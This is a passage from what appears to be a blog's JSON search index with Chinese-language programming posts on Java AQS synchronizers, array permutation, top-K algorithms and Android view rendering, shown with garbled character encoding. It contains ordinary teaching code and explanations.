åˆ†æçš„æ˜¯FairSync,ä½†NonFairSyncçš„åŒºåˆ«å¹¶ä¸å¤§ï¼Œæ¯”æ–¹è¯´å…¬å¹³é”éµå®ˆå…ˆæ¥ååˆ°ï¼ˆæ‰€æœ‰çš„çº¿ç¨‹éƒ½ä¼šäº‰ç€å»æ’é˜Ÿåˆ°tailï¼‰ï¼Œéå…¬å¹³é”åˆ™æ˜¯ä¸Šæ¥å°±è¯•ç€ç”¨casæŠ¢é”(æŠ¢æˆåŠŸçš„è¯å°±setExclusiveOwner)ï¼Œä¸æˆåŠŸçš„è¯æ‰èµ°æ’é˜Ÿé‚£ä¸€å¥— æŒ‚èµ·çº¿ç¨‹å’Œå”¤é†’çº¿ç¨‹ä½¿ç”¨çš„æ˜¯LockSupport.park(this);LockSupport.unpark(s.thread);æ ¹æ®ç½‘ä¸Šçš„åˆ†æï¼Œåœ¨nativeå±‚ä½¿ç”¨çš„æ˜¯cppçš„pthread_mutexï¼Œä¸æ˜¯å¯ä»¥é‡å…¥çš„(ä¹Ÿå°±æ˜¯ä¸è¦ä¹±æ¥ï¼Œlockå’Œunlockä¸€å®šè¦é…å¯¹ä½¿ç”¨) ä½¿ç”¨åˆ°äº†AbstractQueuedSynchronizerçš„ç±»åŒ…æ‹¬reentrantLockä¸­çš„Sync, ThreadPoolExecutorä¸­çš„workerï¼ŒCountDownLatchä¸­çš„Sync,Semaphore.Syncã€‚ä»¥ä¸‹åˆ†åˆ«å±•å¼€è¿™äº›ç±»çš„å™è¿° ReentrantLockéå¸¸å¸¸è§çš„é”ï¼Œæ³¨æ„çš„æ˜¯ä¸€å®šè¦åœ¨finallyé‡Œé¢é‡Šæ”¾æ‰é”ã€‚å†…éƒ¨åŒ…å«ä¸€ä¸ªSyncé™æ€ç±»ã€‚ä¸Šè¿°å·²ç»æåˆ°äº†ReentrantLockæ˜¯å¦‚ä½•é€šè¿‡Syncå®Œæˆlockä»¥åŠåç»­èŠ‚ç‚¹çš„å”¤é†’çš„ CountDownLatchä¸»çº¿ç¨‹å¯åŠ¨å‡ æ¡çº¿ç¨‹åŒæ—¶èµ·è·‘ï¼Œå¸Œæœ›ä¸»çº¿ç¨‹ä¸è¦æ€¥ç€é€€å‡ºï¼Œç­‰å…¶ä»–çº¿ç¨‹è·‘å®Œï¼Œä¸»çº¿ç¨‹å†æ¢å¤è¿è¡Œï¼Œè¿™ç§åœºæ™¯ç”¨CountDownLatchå¯ä»¥ï¼Œç”¨CyclicBarrierå¯ä»¥ï¼Œç”¨Phaserä¹Ÿå¯ä»¥ã€‚å‚è€ƒPhaser ä½¿ç”¨ä»‹ç»ä¸­çš„ç¤ºä¾‹ä»£ç  ä½¿ç”¨CountDownLatchçš„è¯ // 1. è®¾ç½® count ä¸º 1 CountDownLatch latch = new CountDownLatch(1); for (int i = 0; i &lt; 10; i++) { new Thread(() -&gt; { try { // 2. æ¯ä¸ªçº¿ç¨‹éƒ½ç­‰åœ¨æ …æ è¿™é‡Œï¼Œç­‰å¾…æ”¾å¼€æ …æ ï¼Œä¸ä¼šå› ä¸ºæœ‰äº›çº¿ç¨‹å…ˆå¯åŠ¨å°±å…ˆè·‘è·¯äº† latch.await(); // doWork(); } catch (InterruptedException ignore) { } }).start(); } doSomethingELse(); // ç¡®ä¿åœ¨ä¸‹é¢çš„ä»£ç æ‰§è¡Œä¹‹å‰ï¼Œä¸Šé¢æ¯ä¸ªçº¿ç¨‹éƒ½åˆ°äº† await() ä¸Šã€‚ // 3. æ”¾å¼€æ …æ  latch.countDown(); CountDownLatch.java public void await() throws InterruptedException { sync.acquireSharedInterruptibly(1); } public void countDown() { sync.releaseShared(1); } awaitä¸­ä½¿å½“å‰çº¿ç¨‹åœä¸‹æ¥çš„æ–¹æ³•åœ¨doAcquireSharedInterruptiblyä¸­ï¼Œè€Œå”¤é†’çº¿ç¨‹çš„æ–¹æ³•åœ¨releaseSharedä¸­ã€‚CountDownLatchå› ä¸ºæœ‰ä¸€ä¸ªcountçš„æ¦‚å¿µï¼Œæ‰€ä»¥åœ¨è°ƒç”¨releaseSharedä¹‹å‰æ€»æ˜¯ä¼šåˆ¤æ–­å½“å‰countæ˜¯å¦å·²ç»åˆ°è¾¾äº†0ã€‚å› ä¸ºä¸€æ—¦åˆ°è¾¾äº†0ï¼Œé‚£ä¹ˆåœ¨ç­‰å¾…çš„çº¿ç¨‹(è°ƒç”¨äº†awaitçš„çº¿ç¨‹å°±å¯ä»¥æ¢å¤è¿è¡Œ)ã€‚ CountDownLatchçš„åŸç†ï¼š AQS å…±äº«æ¨¡å¼çš„å…¸å‹ä½¿ç”¨ï¼Œæ„é€ å‡½æ•°ä¸­çš„ 1 æ˜¯è®¾ç½®ç»™ AQS çš„ state çš„ã€‚latch.await() æ–¹æ³•ä¼šé˜»å¡ï¼Œè€Œ latch.countDown() æ–¹æ³•å°±æ˜¯ç”¨æ¥å°† stateâ€“ çš„ï¼Œå‡åˆ° 0 ä»¥åï¼Œå”¤é†’æ‰€æœ‰çš„é˜»å¡åœ¨ await() æ–¹æ³•ä¸Šçš„çº¿ç¨‹ã€‚ CyclicBarrier æ¥å®ç°è¿™ç§å‡ æ¡çº¿ç¨‹åŒæ­¥çš„æ–¹æ³•æ›´ç®€å•// 1. æ„é€ å‡½æ•°ä¸­æŒ‡å®šäº† 10 ä¸ª parties CyclicBarrier barrier = new CyclicBarrier(10); for (int i = 0; i &lt; 10; i++) { executorService.submit(() -&gt; { try { // 2. æ¯ä¸ªçº¿ç¨‹&quot;æŠ¥å‘Š&quot;è‡ªå·±åˆ°äº†ï¼Œ // å½“ç¬¬10ä¸ªçº¿ç¨‹åˆ°çš„æ—¶å€™ï¼Œä¹Ÿå°±æ˜¯æ‰€æœ‰çš„çº¿ç¨‹éƒ½åˆ°é½äº†ï¼Œä¸€èµ·é€šè¿‡ barrier.await(); // doWork() } catch (InterruptedException | BrokenBarrierException ex) { ex.printStackTrace(); } }); } Phaserå…¶å®æ˜¯ç”¨åˆ°çš„æ¯”è¾ƒå°‘çš„Phaser phaser = new Phaser(); // 1. æ³¨å†Œä¸€ä¸ª party phaser.register(); for (int i = 0; i &lt; 10; i++) { phaser.register(); executorService.submit(() -&gt; { // 2. æ¯ä¸ªçº¿ç¨‹åˆ°è¿™é‡Œè¿›è¡Œé˜»å¡ï¼Œç­‰å¾…æ‰€æœ‰çº¿ç¨‹åˆ°è¾¾æ …æ  phaser.arriveAndAwaitAdvance(); // doWork() }); } phaser.arriveAndAwaitAdvance(); ä¸Šè¿°ä»£ç ä¸­phaser.registerè¢«è°ƒç”¨äº†11æ¬¡ï¼Œå°±åƒå¼€ä¼šä¸€æ ·ï¼Œæ‰€æœ‰äººéƒ½åˆ°é½äº†æ‰èƒ½å¼€å§‹ ThreadPoolExecutor.WorkerSemaphoreSemaphereçš„æ„é€ å‡½æ•°ä¸­å¯ä»¥ä¼ ä¸€ä¸ªintå‚æ•°,ç”¨äºæ ‡è¯†åŒæ—¶æœ€å¤šæœ‰å‡ æ¡çº¿ç¨‹å¯ä»¥è·å¾—permitï¼ˆä¹Ÿå°±æ˜¯åŒæ—¶æœ€å¤šæœ‰å‡ æ¡çº¿ç¨‹è¿›å…¥acquireå’Œreleaseä¹‹é—´çš„ä»£ç å—ä¸­ï¼‰ Semaphore.acquire(); // æ“ä½œæ•°æ® Semaphore.release(); å‡å¦‚æ„é€ å‡½æ•°ä¸­ä¼ å…¥äº†1ï¼Œé‚£ä¹ˆè¿™ä¸ªsemaphoreå®é™…ä¸Šæ˜¯ä¸€ä¸ªlockæˆ–è€…è¯´mutexï¼Œå¦‚æœå¤§äºä¸€ï¼Œé‚£ä¹ˆåŒæ—¶è¿›å…¥è¿™æ®µä»£ç å—é‡Œçš„çº¿ç¨‹å°±æœ‰å¤šä¸ªäº†ï¼Œå°±éœ€è¦å®ç°è‡ªå·±çš„åŒæ­¥é€»è¾‘ã€‚ï¼ˆrace conditionï¼Œå¾€å¾€è¦åŠ ä¸€æ®µsleepå°±èƒ½å¿«é€Ÿé‡ç°ï¼Œæ¯”å¦‚ä¸¤æ¡çº¿ç¨‹åŒæ—¶å¯¹ä¸€ä¸ªint 0 è‡ªå¢ï¼Œé‚£ä¹ˆææœ‰å¯èƒ½å¾—åˆ°çš„ç»“æœæ˜¯1è€Œä¸æ˜¯é¢„æœŸçš„2ï¼Œå› ä¸ºå„è‡ªçœ‹åˆ°çš„éƒ½æ˜¯0ï¼‰ ExchangerExchangeræ˜¯æˆåŒæˆå¯¹ä½¿ç”¨çš„ï¼Œæ”¯æŒæ³›å‹ï¼Œä¸¤æ¡çº¿ç¨‹åŒæ—¶å¼€è·‘ï¼Œå…ˆåˆ°çš„ä¼šç­‰ç€ï¼Œä¸¤ä¸ªéƒ½åˆ°äº†ä¹‹åï¼Œäº’ç›¸äº¤æ¢æ³›å‹çš„æ•°æ® Mutexjucé‡Œé¢æ²¡æœ‰cè¯­è¨€é‚£æ ·çš„mutexï¼Œä¸è¿‡Reentrantlockè¿™ç§å®é™…ä¸Šå°±å‘æŒ¥äº†mutexçš„ä½œç”¨ã€‚ tbdä½¿ç”¨AQSçš„æ™®éæ–¹å¼æ˜¯è‡ªå·±ç»§æ‰¿å®ç°ä¸€ä¸ªSyncï¼ˆå†™ä¸€ä¸ªè¯•è¯•çœ‹ï¼ŸTomcaté‡Œé¢å°±æœ‰ï¼‰ ç®€æ˜æ¦‚æ‹¬ AQSæœ‰ä¸ªä¸´ç•Œå˜é‡state,å½“ä¸€ä¸ªçº¿ç¨‹è·å–åˆ°state==0æ—¶, è¡¨ç¤ºè¿™ä¸ªçº¿ç¨‹è¿›å…¥äº†ä¸´ç•Œä»£ç (è·å–åˆ°é”), å¹¶åŸå­åœ°æŠŠè¿™ä¸ªå˜é‡å€¼+1 æ²¡èƒ½è¿›å…¥ä¸´ç•ŒåŒº(è·å–é”å¤±è´¥)çš„çº¿ç¨‹, ä¼šåˆ©ç”¨CASçš„æ–¹å¼æ·»åŠ åˆ°åˆ°CLHé˜Ÿåˆ—å°¾å», å¹¶è¢«LockSupport.parkæŒ‚èµ·. å½“çº¿ç¨‹é‡Šæ”¾é”çš„æ—¶å€™, ä¼šå”¤é†’headèŠ‚ç‚¹çš„ä¸‹ä¸€ä¸ªéœ€è¦å”¤é†’çš„çº¿ç¨‹(æœ‰äº›çº¿ç¨‹canceläº†å°±ä¸éœ€è¦å”¤é†’äº†) è¢«å”¤é†’çš„çº¿ç¨‹æ£€æŸ¥ä¸€ä¸‹è‡ªå·±çš„å‰ç½®èŠ‚ç‚¹æ˜¯ä¸æ˜¯headèŠ‚ç‚¹(CLHé˜Ÿåˆ—çš„headèŠ‚ç‚¹å°±æ˜¯ä¹‹å‰æ‹¿åˆ°é”çš„çº¿ç¨‹èŠ‚ç‚¹)çš„ä¸‹ä¸€ä¸ªèŠ‚ç‚¹,å¦‚æœä¸æ˜¯åˆ™ç»§ç»­æŒ‚èµ·, å¦‚æœæ˜¯çš„è¯, ä¸å…¶ä»–çº¿ç¨‹é‡æ–°äº‰å¤ºä¸´ç•Œå˜é‡,å³é‡å¤ç¬¬1æ­¥ å‚è€ƒä¸€è¡Œä¸€è¡Œæºç åˆ†ææ¸…æ¥š AbstractQueuedSynchronizer","tags":[{"name":"java","slug":"java","permalink":"https://haldir65.github.io/tags/java/"}]},{"title":"ç®—æ³•-æ•°ç»„å…¨æ’åˆ—","date":"2019-04-03T13:44:25.000Z","path":"2019/04/03/2019-04-03-algorithm-array-permutation/","text":"é—®é¢˜æè¿° å…¨æ’åˆ—è¡¨ç¤ºæŠŠé›†åˆä¸­å…ƒç´ çš„æ‰€æœ‰æŒ‰ç…§ä¸€å®šçš„é¡ºåºæ’åˆ—èµ·æ¥ï¼Œä½¿ç”¨P(n, n) = n!è¡¨ç¤ºnä¸ªå…ƒç´ å…¨æ’åˆ—çš„ä¸ªæ•°ã€‚P(n, n)ä¸­çš„ç¬¬ä¸€ä¸ªnè¡¨ç¤ºå…ƒç´ çš„ä¸ªæ•°ï¼Œç¬¬äºŒä¸ªnè¡¨ç¤ºå–å¤šå°‘ä¸ªå…ƒç´ è¿›è¡Œæ’åˆ—ã€‚æ¯”æ–¹è¯´[1,2,3]è¿™ä¸ªæ•°ç»„ï¼Œå…¨æ’åˆ—å°±æœ‰è¿™6ç§ç»“æœ [1,2,3] [1,3,2] [2,1,3] [2,3,1] [3,1,2] [3,2,1] ç»™å®šä¸€ä¸ªnä¸ªå…ƒç´ æ•°ç»„ï¼Œå…¶å…¨æ’åˆ—çš„è¿‡ç¨‹å¯ä»¥æè¿°å¦‚ä¸‹ï¼šï¼ˆ1ï¼‰ä»»æ„å–ä¸€ä¸ªå…ƒç´ æ”¾åœ¨ç¬¬ä¸€ä¸ªä½ç½®ï¼Œåˆ™æœ‰nç§é€‰æ‹©ï¼›ï¼ˆ2ï¼‰å†å‰©ä¸‹çš„n-1ä¸ªå…ƒç´ ä¸­å†å–ä¸€ä¸ªå…ƒç´ æ”¾åœ¨ç¬¬äºŒä¸ªä½ç½®åˆ™æœ‰n-1ç§é€‰æ‹©ï¼Œæ­¤æ—¶å¯ä»¥çœ‹åšå¯¹n-1ä¸ªå…ƒç´ è¿›è¡Œå…¨æ’åˆ—ï¼›ï¼ˆ3ï¼‰é‡å¤ç¬¬äºŒæ­¥ï¼Œç›´åˆ°å¯¹æœ€åä¸€ä¸ªå…ƒç´ è¿›è¡Œå…¨æ’åˆ—ï¼Œå³æœ€åä¸€ä¸ªå…ƒç´ æ”¾åœ¨æœ€åä¸€ä¸ªä½ç½®ï¼Œå…¨æ’åˆ—ç»“æŸã€‚ ä»¥æ•°ç»„{1,2,3}ä¸ºä¾‹ï¼Œå…¶å…¨æ’åˆ—çš„è¿‡ç¨‹å¦‚ä¸‹ï¼šï¼ˆ1ï¼‰1åé¢è·Ÿï¼ˆ2,3ï¼‰çš„å…¨æ’åˆ—ï¼›ï¼ˆ2ï¼‰2åé¢è·Ÿï¼ˆ1,3ï¼‰çš„å…¨æ’åˆ—ï¼›ï¼ˆ3ï¼‰3åé¢è·Ÿï¼ˆ1,2ï¼‰çš„å…¨æ’åˆ—ã€‚ é€’å½’ç‰ˆæœ¬çš„å®ç°#include &lt;iostream&gt; using namespace std; int sum=0; //å…¨æ’åˆ—ä¸ªæ•° //æ‰“å°æ•°ç»„å†…å®¹ void print(int array[],int len){ printf(&quot;{&quot;); for(int i=0; i&lt;len;++i) cout&lt;&lt;array[i]&lt;&lt;&quot; &quot;; printf(&quot;}\\n&quot;); } //å®ç°ä¸¤æ•°äº¤æ¢ void swap(int* o,int i,int j){ int tmp = o[i]; o[i] = o[j]; o[j] = tmp; } //é€’å½’å®ç°æ•°ç»„å…¨æ’åˆ—å¹¶æ‰“å° void permutation(int array[],int len,int index){ if(index==len){//å…¨æ’åˆ—ç»“æŸ ++sum; print(array,len); } else for(int i=index;i&lt;len;++i){ //å°†ç¬¬iä¸ªå…ƒç´ äº¤æ¢è‡³å½“å‰indexä¸‹æ ‡å¤„ swap(array,index,i); //ä»¥é€’å½’çš„æ–¹å¼å¯¹å‰©ä¸‹å…ƒç´ è¿›è¡Œå…¨æ’åˆ— permutation(array,len,index+1); //å°†ç¬¬iä¸ªå…ƒç´ äº¤æ¢å›åŸå¤„ swap(array,index,i); } } int main(){ int array[3]={1,2,3}; permutation(array,3,0); cout&lt;&lt;&quot;sum:&quot;&lt;&lt;sum&lt;&lt;endl; getchar(); } è€ƒè™‘æ•°ç»„å…ƒç´ ä¸­æœ‰é‡å¤çš„å…ƒç´ å¯¹äº[1,2,2]è¿™ç§æ•°ç»„ï¼ŒæŠŠç¬¬ä¸€ä¸ªæ•°1å’Œç¬¬äºŒä¸ªæ•°2äº’æ¢å¾—åˆ°[2,1,2],æ¥ä¸‹æ¥ç¬¬ä¸€ä¸ªæ•°1ä¸ç¬¬ä¸‰ä¸ªæ•°2äº’æ¢å°±æ²¡æœ‰å¿…è¦äº†ã€‚å†è€ƒè™‘[2,1,2]ï¼Œç¬¬äºŒä¸ªæ•°ä¸ç¬¬ä¸‰ä¸ªæ•°äº’æ¢å¾—åˆ°[2,2,1],è‡³æ­¤å…¨æ’åˆ—ç»“æŸã€‚ è¿™æ ·æˆ‘ä»¬ä¹Ÿå¾—åˆ°äº†åœ¨å…¨æ’åˆ—ä¸­å»æ‰é‡å¤çš„è§„åˆ™â€”â€”å»é‡çš„å…¨æ’åˆ—å°±æ˜¯ä»ç¬¬ä¸€ä¸ªæ•°å­—èµ·æ¯ä¸ªæ•°åˆ†åˆ«ä¸å®ƒåé¢éé‡å¤å‡ºç°çš„æ•°å­—äº¤æ¢ã€‚ ä¿®æ”¹ä»£ç å¦‚ä¸‹: //æ˜¯å¦äº¤æ¢ bool isSwap(int array[],int len,int index){ for(int i=index+1;i&lt;len;++i)//ä»è¿™ä¸ªindexå¼€å§‹ï¼Œå¾€åä¸€æ—¦å‡ºç°äº†å’Œè¯¥æ•°å­—é‡å¤çš„ï¼Œä¸ç”¨äº’æ¢äº† if(array[index]==array[i]) return false; return true; } //é€’å½’å®ç°æœ‰é‡å¤å…ƒç´ çš„æ•°ç»„å…¨æ’åˆ— void permutation(int array[],int len,int index){ if(index==len){//å…¨æ’åˆ—ç»“æŸ ++sum; print(array,len); //å¦‚æœåªæœ‰ä¸€ä¸ªçš„è¯ï¼Œé‚£å¿…ç„¶å·²æ˜¯å…¨æ’åˆ—å®Œæˆäº†çš„ } else for(int i=index;i&lt;len;++i){ if(isSwap(array,len,i)){ //æ–°å¢åˆ¤æ–­æ˜¯å¦äº¤æ¢ //å°†ç¬¬iä¸ªå…ƒç´ äº¤æ¢è‡³å½“å‰indexä¸‹æ ‡å¤„ swap(array,index,i); //ä»¥é€’å½’çš„æ–¹å¼å¯¹å‰©ä¸‹å…ƒç´ è¿›è¡Œå…¨æ’åˆ— permutation(array,len,index+1);//å›ºå®šå½“å‰çš„é¦–ä½å…ƒç´ ï¼Œé€’å½’æ±‚å‰©ä¸‹çš„å…¨æ’åˆ—ç§ç±» //å°†ç¬¬iä¸ªå…ƒç´ äº¤æ¢å›åŸå¤„ swap(array,index,i); } } } å‚è€ƒæ•°ç»„çš„å…¨æ’åˆ—","tags":[{"name":"ç®—æ³•","slug":"ç®—æ³•","permalink":"https://haldir65.github.io/tags/ç®—æ³•/"}]},{"title":"ç®—æ³•-Top-Ké—®é¢˜","date":"2019-03-30T22:17:37.000Z","path":"2019/03/30/2019-03-30-algorithm-top-K/","text":"10äº¿ä¸ªæ•°ä¸­æ‰¾å‡ºæœ€å¤§çš„10000ä¸ªæ•°ï¼ˆtop Ké—®é¢˜ï¼‰ 1. ç›´æ¥æ’åºç„¶åå–æœ€å¤§çš„Kä¸ªæ•°æ€»çš„æ—¶é—´å¤æ‚åº¦ä¸ºO(NlogN)+O(K)=O(NlogN)ã€‚è¯¥ç®—æ³•å­˜åœ¨ä»¥ä¸‹é—®é¢˜ï¼š å¿«é€Ÿæ’åºçš„å¹³å‡å¤æ‚åº¦ä¸ºO(N*logN)ï¼Œä½†æœ€åæ—¶é—´å¤æ‚åº¦ä¸ºO(n2)ï¼Œä¸èƒ½å§‹ç»ˆä¿è¯è¾ƒå¥½çš„å¤æ‚åº¦åªéœ€è¦å‰kå¤§æˆ–kå°çš„æ•°,ï¼Œå®é™…å¯¹å…¶ä½™ä¸éœ€è¦çš„æ•°ä¹Ÿè¿›è¡Œäº†æ’åºï¼Œæµªè´¹äº†å¤§é‡æ’åºæ—¶é—´ 2. åˆ©ç”¨å¿«é€Ÿæ’åºçš„ç‰¹ç‚¹åœ¨æ•°ç»„ä¸­éšæœºæ‰¾ä¸€ä¸ªå…ƒç´ keyï¼Œå°†æ•°ç»„åˆ†æˆä¸¤éƒ¨åˆ†Saå’ŒSbï¼Œå…¶ä¸­Saçš„å…ƒç´ &gt;=keyï¼ŒSbçš„å…ƒç´ &lt;key è‹¥Saä¸­å…ƒç´ çš„ä¸ªæ•°å¤§äºæˆ–ç­‰äºkï¼Œåˆ™åœ¨Saä¸­æŸ¥æ‰¾æœ€å¤§çš„kä¸ªæ•°è‹¥Saä¸­å…ƒç´ çš„ä¸ªæ•°å°äºkï¼Œå…¶ä¸ªæ•°ä¸ºlenï¼Œåˆ™åœ¨Sbä¸­æŸ¥æ‰¾k-lenä¸ªæ•°å­— public static int findTopK(int[] array, int left, int right, int k) { int index = -1; if (left &lt; right) { int pos = partition(array, left, right); int len = pos - left + 1; if (len == k) { index = pos; } else if (len &lt; k) {//Saä¸­å…ƒç´ ä¸ªæ•°å°äºKï¼Œåˆ°Sbä¸­æŸ¥æ‰¾k-lenä¸ªæ•°å­— index = findTopK(array, pos + 1, right, k - len); } else {//Saä¸­å…ƒç´ çš„ä¸ªæ•°å¤§äºæˆ–ç­‰äºk index = findTopK(array, left, pos - 1, k); } } return index; } /** * æŒ‰åŸºå‡†ç‚¹åˆ’åˆ†æ•°ç»„ï¼Œå·¦è¾¹çš„å…ƒç´ å¤§äºåŸºå‡†ç‚¹ï¼Œå³è¾¹çš„å…ƒç´ å°äºåŸºå‡†ç‚¹ * * @param array * @param left * @param right * @return */ public static int partition(int[] array, int left, int right) { int x = array[left];//åŸºå‡†ç‚¹ï¼Œéšæœºé€‰æ‹© do { while (array[right] &lt; x &amp;&amp; left &lt; right)//ä»åå‘å‰æ‰«æï¼Œæ‰¾åˆ°ç¬¬ä¸€ä¸ªæ¯”åŸºå‡†ç‚¹å¤§çš„å…ƒç´  right--; if (left &lt; right) { array[left] = array[right];//å¤§å…ƒç´ å‰ç§» left++; } while (array[left] &gt;= x &amp;&amp; left &lt; right) //ä»å‰å‘åæ‰«æï¼Œæ‰¾åˆ°ç¬¬ä¸€ä¸ªæ¯”åŸºå‡†ç‚¹å°çš„å…ƒç´  left++; if (left &lt; right) { array[right] = array[left];//å°å…ƒç´ åç§» right--; } } while (left &lt; right); array[left] = x; return left; } 3. å°é¡¶å †å †æ’åºåœ¨å¤„ç†æµ·é‡æ•°æ®çš„æ—¶å€™ååˆ†æœ‰æ•ˆæŸ¥æ‰¾æœ€å¤§çš„Kä¸ªæ•°ï¼Œå…¶å®å°±æ˜¯å»ºç«‹ä¸€ä¸ªå¤§å°ä¸ºKçš„å°é¡¶å †ï¼Œæ¯æ¬¡å‡ºç°æ¯”é¡¶éƒ¨å¤§çš„å…ƒç´ æ—¶ï¼Œæ›¿æ¢ï¼Œå¹¶é‡æ–°è°ƒæ•´å †ä»£ç å®ç°å¦‚ä¸‹ä¸‹é¢è¿™ä¸ªæ˜¯æ‰¾å‡ºæœ€å°çš„Kä¸ªå…ƒç´ ï¼Œå¹¶ä¸”æ˜¯æ„å»ºå¤§é¡¶å † public static int[] findTopK(int[] array, int k) { int heapArray[] = new int[k]; for (int i = 0; i &lt; k; i++) { heapArray[i] = array[i]; } buildMaxHeap(heapArray); for (int i = k; i &lt; array.length; i++) { if (array[i] &lt; heapArray[0]) { heapArray[0] = array[i];//æ›´æ–°å †é¡¶ adjustMaxHeap(heapArray, 0, heapArray.length); } } return heapArray; } /** * æ„å»ºå°é¡¶å † * * @param array */ public static void buildMaxHeap(int[] array) { for (int i = array.length / 2 - 1; i &gt;= 0; i--) { adjustMaxHeap(array, i, array.length); } } /** * è°ƒæ•´å †ç»“æ„ * * @param array * @param root æ ¹èŠ‚ç‚¹ * @param length */ public static void adjustMaxHeap(int[] array, int root, int length) { int left = root * 2 + 1; //å·¦èŠ‚ç‚¹ä¸‹æ ‡ï¼Œæ•°ç»„ä¸‹æ ‡ä»0å¼€å§‹ï¼Œæ‰€ä»¥åŠ 1 int right = left + 1; //å³èŠ‚ç‚¹ä¸‹æ ‡ int largest = root;// å­˜æ”¾ä¸‰ä¸ªèŠ‚ç‚¹ä¸­æœ€å¤§èŠ‚ç‚¹çš„ä¸‹æ ‡ if (left &lt; length &amp;&amp; array[left] &gt; array[root]) { //å·¦èŠ‚ç‚¹å¤§äºæ ¹èŠ‚ç‚¹ï¼Œæ›´æ–°æœ€å¤§èŠ‚ç‚¹çš„ä¸‹æ ‡ largest = left; } if (right &lt; length &amp;&amp; array[right] &gt; array[largest]) {//å³èŠ‚ç‚¹å¤§äºæ ¹èŠ‚ç‚¹ï¼Œæœ€å¤§èŠ‚ç‚¹çš„ä¸‹æ ‡ largest = right; } if (root != largest) { swap(array, largest, root); adjustMaxHeap(array, largest, length); } } /** * äº¤æ¢ * * @param arr * @param i * @param j */ public static void swap(int[] arr, int i, int j) { int temp = arr[i]; arr[i] = arr[j]; arr[j] = temp; } ç®—æ³•çš„æ—¶é—´å¤æ‚åº¦ä¸ºO(N * logk) 4. å‡å¦‚æ•°æ®çš„æœ€å¤§å€¼å’Œæœ€å°å€¼å·®è·ä¸å¤§ï¼Œéƒ½æ˜¯æ•´æ•°çš„è¯ï¼Œå¯ä»¥è€ƒè™‘ç”³è¯·ä¸€ä¸ªæ•°ç»„ï¼Œå­˜æ”¾æ¯ä¸ªå…ƒç´ å‡ºç°çš„æ¬¡æ•°ï¼Œç»“æŸåå¯¹è¿™ä¸ªæ•°ç»„ä»åå¾€å‰ç»Ÿè®¡ï¼Œç¢°åˆ°countå¤§äº0çš„è¯´æ˜å‡ºç°è¿‡ï¼Œç»Ÿè®¡åˆ°äº†Kä¸ªå°±ç»“æŸpublic static List&lt;Integer&gt; findTopK(int[] array, int k) { int max = array[0]; for (int i = 0; i &lt; array.length; i++) { if (max &lt; array[i]) { max = array[i]; } } int count[] = new int[max + 1]; for (int i = 0; i &lt; array.length; i++) { count[array[i]] += 1; } List&lt;Integer&gt; topKList = new ArrayList&lt;&gt;(); for (int sumCount = 0, j = count.length - 1; j &gt;= 0; j--) { int c = count[j]; sumCount += c; if (c &gt; 0) { for (int i = 0; i &lt; c; i++) { topKList.add(j); } } if (sumCount &gt;= k) { break; } } return topKList; } è¯¥ç®—æ³•è¿˜å¯ä»¥ç”¨bitmapç®—æ³•ä¼˜åŒ–ï¼Œç”¨ä¸€ä¸ªintè¡¨ç¤º32ä¸ªæ•´æ•°ã€‚","tags":[{"name":"ç®—æ³•","slug":"ç®—æ³•","permalink":"https://haldir65.github.io/tags/ç®—æ³•/"}]},{"title":"ä»setContentViewå¼€å§‹è°ˆçš„æ¸²æŸ“æµç¨‹","date":"2019-03-29T09:25:01.000Z","path":"2019/03/29/2019-03-29-from-setcontentview-to-rendering/","text":"è°ˆä¸€è°ˆViewçš„æ¸²æŸ“æµç¨‹å§ Activityä¸è´Ÿè´£æ§åˆ¶è§†å›¾ï¼Œå®ƒä¸»è¦æ§åˆ¶ç”Ÿå‘½å‘¨æœŸå’Œå¤„ç†äº‹ä»¶ã€‚Activityä¸­é€šè¿‡æŒæœ‰PhoneWindowæ¥æ§åˆ¶è§†å›¾,è€Œäº‹ä»¶åˆ™æ˜¯é€šè¿‡WindowCallbackæ¥ä¼ è¾¾ç»™Activityçš„Windowï¼ˆå”¯ä¸€å®ç°ç±»æ˜¯PhoneWindowï¼‰ã€‚PhoneWindowæ˜¯åœ¨activityçš„attachä¸­newå‡ºæ¥çš„ï¼Œå¹¶ä¸”è®¾ç½®äº†PhoneWindow.setCallback(this)ã€‚å¤§è‡´ä»£ç å¦‚ä¸‹ //activity.java final void attach(Context context, ActivityThread aThread, Instrumentation instr, IBinder token, int ident, Application application, Intent intent, ActivityInfo info, CharSequence title, Activity parent, String id, NonConfigurationInstances lastNonConfigurationInstances, Configuration config, String referrer, IVoiceInteractor voiceInteractor, Window window, ActivityConfigCallback activityConfigCallback) { attachBaseContext(context); mWindow = new PhoneWindow(this, window, activityConfigCallback);//åˆ›å»ºä¸€ä¸ªwindow mWindow.setWindowControllerCallback(this); mWindow.setCallback(this); //ç”¨äºå‘activityåˆ†å‘ç‚¹å‡»æˆ–è€…çŠ¶æ€æ”¹å˜äº‹ä»¶ mWindow.setOnWindowDismissedCallback(this); mWindow.setWindowManager( (WindowManager)context.getSystemService(Context.WINDOW_SERVICE), mToken, mComponent.flattenToString(), (info.flags &amp; ActivityInfo.FLAG_HARDWARE_ACCELERATED) != 0);//è®¾ç½®windowManagerå¯¹è±¡ } PhoneWindowä¸­æŒæœ‰äº†DecorViewï¼ŒDecorViewæ˜¯æœ€é¡¶å±‚çš„è§†å›¾ PhoneWindowå’ŒmContentParentDecorViewç»§æ‰¿è‡ªFrameLayoutï¼Œå†…éƒ¨åªæœ‰ä¸€ä¸ªLinearLayoutçš„childï¼ˆmContentParentï¼‰,è¿™ä¸ªlinearLayoutä»ä¸Šåˆ°ä¸‹ä¾æ¬¡æ˜¯ViewStub(actionBar)ï¼Œä¸€ä¸ªFrameLayout(æ ‡é¢˜æ ),ä¸€ä¸ªandroid.R.id.contentçš„FrameLayout.Activityçš„setContentViewèµ°åˆ°äº†PhoneWindowçš„setContentViewä¸­ // PhoneWindow.java @Override public void setContentView(int layoutResID) { installDecor(); //æœ‰æ‰€åˆ å‡ mLayoutInflater.inflate(layoutResID, mContentParent); } private void installDecor() { if (mDecor == null) { mDecor = generateDecor(-1); //newä¸€ä¸ªDecorViewå‡ºæ¥ } if (mContentParent == null) { mContentParent = generateLayout(mDecor); //æ ¹æ®ä¸åŒçš„themeåˆ›å»ºDecorViewçš„child } } protected DecorView generateDecor(int featureId) { return new DecorView(context, featureId, this, getAttributes());//DecorViewä¹Ÿå°±æŒæœ‰äº†windowå¯¹è±¡ } protected ViewGroup generateLayout(DecorView decor) { // Inflate the window decor. int layoutResource; //æ ¹æ®ä¸åŒçš„themeï¼Œå¯èƒ½å‡ºç°çš„layoutResourceæœ‰ layoutResource = R.layout.screen_swipe_dismiss; layoutResource = R.layout.screen_title_icons; layoutResource = R.layout.screen_progress; layoutResource = R.layout.screen_custom_title; layoutResource 